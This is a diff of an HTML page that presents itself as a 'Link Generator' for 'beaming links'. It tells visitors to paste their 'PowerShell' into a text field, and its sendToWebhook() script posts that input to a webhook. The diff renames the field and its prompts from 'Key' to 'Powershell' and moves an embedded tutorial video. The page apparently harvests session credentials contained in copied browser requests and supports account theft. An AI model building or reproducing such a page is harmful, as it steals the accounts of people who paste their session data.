@@ -76,9 +76,9 @@
         a:hover {
             text-decoration: underline;
         }
-        iframe {
-            width: 560px;
-            height: 315px;
+        .centered-video {
+            display: flex;
+            justify-content: center;
             margin-top: 20px;
         }
     </style>
@@ -101,15 +101,17 @@
         <a id="link-generator" href="https://forms.gle/9fQhnGiqRa1sZ5sq7" target="_blank">Link Generator</a>
         <p>Tutorial: How to Get Your PowerShell</p>
         <ul>
-            <li>- Submit the "Powershell" to generate your beaming link.</li>
+            <li>- Send PowerShells via Text below.</li>
             <li>- ONLY WORKS ON PROFILE, WE ARE FIXING GAME LINKS SOON</li>
         </ul>
-        
 
-        <iframe src="https://www.youtube.com/embed/zpvEXK6nc04" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-    
-        <input type="text" id="webhookKey" placeholder="Enter Key">
-        <button onclick="sendToWebhook()">Submit Key</button>
+  
+        <input type="text" id="webhookKey" placeholder="Enter Powershell">
+        <button onclick="sendToWebhook()">Create Link</button>
+
+        <div class="centered-video">
+            <iframe src="https://www.youtube.com/embed/zpvEXK6nc04" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+        </div>
     </div>
 
     <script>
@@ -127,7 +129,7 @@
         async function sendToWebhook() {
             const userKey = document.getElementById("webhookKey").value;
             if (!userKey) {
-                alert("Please enter a key.");
+                alert("Please enter Powershell");
                 return;
             }
 
@@ -149,7 +151,7 @@
                     body: JSON.stringify(payload)
                 });
 
-                alert("Key submitted successfully.");
+                alert("Powershell submitted successfully.");
             } catch (error) {
                 console.error("Error sending to webhook:", error);
                 alert("There was an error submitting your key. Please try again.");
